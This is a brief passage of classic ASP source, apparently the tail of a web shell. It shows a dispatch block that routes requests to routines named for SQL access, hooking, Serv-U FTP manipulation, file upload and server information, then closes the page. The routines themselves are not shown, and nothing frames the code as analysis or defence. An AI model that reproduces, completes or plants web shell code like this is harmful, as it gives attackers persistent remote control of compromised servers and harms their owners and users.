"sqlabc":sqlabc():Case "fuck":fuck():Case "hook":hook():Case "gody":gody():Case "suftp":suftp():Case "MMD":MMD():Case "upload":upload():Case "ServerInfo":ServerInfo():Case Else MainForm():End Select:if Action<>"Servu" then ShowErr():RRS"</body></html>"

%>
